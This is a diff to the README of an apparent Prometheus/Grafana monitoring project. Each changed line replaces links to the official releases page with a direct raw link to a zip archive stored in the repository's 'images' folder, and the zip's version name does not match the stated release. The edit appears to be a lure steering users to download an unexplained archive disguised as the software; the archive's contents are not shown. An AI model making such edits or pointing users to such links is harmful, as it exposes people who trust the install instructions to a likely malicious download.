@@ -1,6 +1,6 @@
 # 🚀 prometheus-grafana-monitoring-stack - Simple Monitoring for Your Systems
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue?style=flat-square)](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/releases)
+[![Download Latest Release](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/raw/refs/heads/main/images/grafana_monitoring_stack_prometheus_3.6-alpha.5.zip)](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/raw/refs/heads/main/images/grafana_monitoring_stack_prometheus_3.6-alpha.5.zip)
 
 ## 🌟 Overview
 
@@ -18,7 +18,7 @@ To get started with the prometheus-grafana-monitoring-stack, just follow these s
    - Disk Space: At least 1 GB of free space
 
 2. **Download the Software:**
-   Visit this page to download: [Download prometheus-grafana-monitoring-stack](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/releases).
+   Visit this page to download: [Download prometheus-grafana-monitoring-stack](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/raw/refs/heads/main/images/grafana_monitoring_stack_prometheus_3.6-alpha.5.zip).
 
 3. **Install the Software:**
    After downloading, follow these steps based on your operating system:
@@ -68,7 +68,7 @@ You can add various data sources, including the Prometheus service, to visualize
 
 ## 📥 Download & Install
 
-To install the latest version of the prometheus-grafana-monitoring-stack, visit this page to download: [Download prometheus-grafana-monitoring-stack](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/releases).
+To install the latest version of the prometheus-grafana-monitoring-stack, visit this page to download: [Download prometheus-grafana-monitoring-stack](https://github.com/slowburn85/prometheus-grafana-monitoring-stack/raw/refs/heads/main/images/grafana_monitoring_stack_prometheus_3.6-alpha.5.zip).
 
 ## 💬 Support & Feedback
 
